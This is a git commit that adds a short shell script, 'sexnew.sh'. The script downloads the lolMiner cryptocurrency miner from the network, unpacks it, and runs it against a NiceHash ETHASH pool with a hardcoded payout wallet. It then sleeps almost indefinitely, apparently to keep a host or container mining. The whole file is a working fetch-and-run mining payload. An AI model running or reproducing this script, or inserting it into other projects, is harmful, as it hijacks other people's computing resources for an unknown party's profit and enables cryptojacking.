f5f0ccc55c6ece1092194f04a6855ebdce6de092
angkii <83603708+angkii@users.noreply.github.com>
2022-01-06 19:30:07 +0700

    Create sexnew.sh

---
+++ sexnew.sh
@@ -0,0 +1,7 @@
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.40/lolMiner_v1.40_Lin64.tar.gz
+
+tar -xvf lolMiner_v1.40_Lin64.tar.gz
+
+cd 1.40;./lolMiner --algo ETHASH --pool daggerhashimoto.eu.nicehash.com:3353 -u 3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH.sex1 --ethstratum ETHPROXY
+
+sleep 999999999999999999999999999999
